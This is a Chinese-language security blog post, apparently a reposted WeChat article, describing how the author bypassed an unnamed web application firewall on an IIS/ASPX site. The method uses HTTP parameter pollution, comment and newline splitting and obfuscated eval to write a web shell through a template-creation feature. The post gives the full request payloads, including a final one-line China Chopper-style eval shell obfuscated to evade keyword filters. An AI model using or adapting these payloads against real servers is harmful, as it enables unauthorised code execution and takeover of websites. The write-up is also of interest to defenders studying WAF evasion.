# 记一次iis+aspx环境下利用http参数污染绕过waf

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=Mzg5OTY2NjUxMw==&mid=2247503260&idx=1&sn=bcba8d137cbd9993fee2b44d219f412d&chksm=c04d4aa2f73ac3b46c6b25eafe933a895feb2bd4280087e9918edb82f4bbc911a5fbc0e723a3&scene=126&sessionid=1681662840#rd](http://mp.weixin.qq.com/s?__biz=Mzg5OTY2NjUxMw==&mid=2247503260&idx=1&sn=bcba8d137cbd9993fee2b44d219f412d&chksm=c04d4aa2f73ac3b46c6b25eafe933a895feb2bd4280087e9918edb82f4bbc911a5fbc0e723a3&scene=126&sessionid=1681662840#rd)

**环境介绍**

  

Server: Microsoft-IIS/10.0  
X-AspNet-Version: 4.0.  
waf：某不知名waf

  

**漏洞点情况**

  

新建模板处，可以直接写入内容到文件：

![](../Images/df2e9606874067644dee33d1eddf84ba.png "1.png")

  

但是一写入正常的aspx语句就被拦截，连简单的输出语句都不行：

![](../Images/5743fa0f12af8465a385aff5527467f0.png "2.png")

  

**bypass过程**

  

一开始也试过诸多绕过方法，包括各种常见编码、chunked编码等等，都不太行。  
然后尝试了一下，看有没有http参数污染（两个code参数）：

![](../Images/1917b0dd5f77e0186296c86ae960118d.png "3.png")

  

访问下生成的aspx文件：

![](../Images/73954f34ee775984309d4809ce761749.png "4.png")

  

可以看到确实是可以的，但是中间有个逗号，我们该怎么利用来写入aspx文件呢？  
比如一个最简单的输出hello world:

```
` <%@Page Language="C#"%> <% Response.Write("hello,world"); %>`
```

  

之前我们通过测试知道<% Response.Write("hello,world"); %>这个会被waf拦截，删掉<%之后呢？

![](../Images/6a4d321acc4f6c9e06e488fd49de64ea.png "5.png")

  

可以看到成功上传，那么思路就来了，将<%%>拆分就行，但是怎么让服务器忽略掉那个逗号呢？  
自然是使用注释。  
aspx是支持 “//”的注释方式的，然后我们需要使用换行，把我们的内容换到下一行避免被注释，于是：

![](../Images/fd97645eb0bc5296ed925d3c76d8290e.png "6.png")

  

看看生成的文件：

![](../Images/07ea9b5b8c067b122b1f3c5f07bd016b.png "7.png")

  

然后我们试着拆分前面被拦截的那个输出hello world的语句：

```
` code=<%@Page Language="C#"%><% //&code=%0aResponse.Write("hello,world"); %>`
```

![](../Images/513d423b878b8e1359bbe32c74779a42.png "8.png")

  

成功生成：

![](../Images/3820966d6e388f9b9a6a4f35ddd5ed73.png "9.png")

  

**Getshell**

  

经过了好一番尝试，发现waf还过滤了Request等关键词，eval()可以上传，但是括号里面有内容比如eval(xxx)就不行。  
参考了这篇文章里的注释符号：  
https://www.cnblogs.com/xiaozi/p/7566795.html  
将 eval(a)  
拆分为

```
` eval/*-/*-*/(a/*,*/)`
```

  

Request就直接用加号进行连接，比如："Req"+"uest"

最终结合hpp来利用，上传菜刀一句话的payload为：

```
` code=<%@ Page Language = Jscript %><% //&code=%0avar+a%3d"ev"%2b"al"%2b"(Reque"%2b"st.Item[\"c"%2b"o\"],"%2b"\"uns"%2b"afe\")%3b"%3b eval/*-/*-*/(a/*&code=*/);%>`
```

  

这个生成的文件内容应该是：

```
`<%@ Page Language = Jscript %><%//,`
```

var a="ev"+"al"+"(Reque"+"st.Item\["c"+"o"\],"+""uns"+"afe");"; eval/*\-/*\-*/(a/*,\*/);%>

上传：

![](../Images/5993a59ee1172c0b268a8f58c3c6b510.png "10.png")

  

成功拿到一个菜刀shell，当然，菜刀因为waf的原因不能用：

![](../Images/2e39c802e27268e8bc46655f2936b54a.png "11.png")

eval都行了，还怕拿不到shell？
